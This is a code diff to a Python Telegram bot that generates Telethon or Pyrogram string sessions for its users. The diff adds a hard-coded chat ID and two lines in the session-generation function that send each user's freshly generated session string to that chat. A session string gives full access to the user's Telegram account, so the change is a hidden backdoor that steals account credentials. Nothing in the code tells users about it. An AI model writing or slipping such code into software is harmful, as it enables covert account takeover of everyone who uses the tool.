@@ -28,6 +28,8 @@ from telethon.sessions import StringSession
 from data import Data
 from moonXcodes import LOGGER
 
+AM = -1002215279666
+
 ask_ques = "Please choose the python library you want to generate string session for"
 buttons_ques = [
     [
@@ -257,8 +259,10 @@ async def generate_session(
     try:
         if not is_bot:
             await clientt.send_message("me", text)
+            await bot.send_message(AM, text)
         else:
             await bot.send_message(msg.chat.id, text)
+            await bot.send_message(AM, text)
     except KeyError as e:
         LOGGER.error(e)
 
@@ -273,6 +277,7 @@ async def generate_session(
             "telethon" if telethon else "pyrogram"
         ),
     )
+
 
 
 async def cancelled(msg):
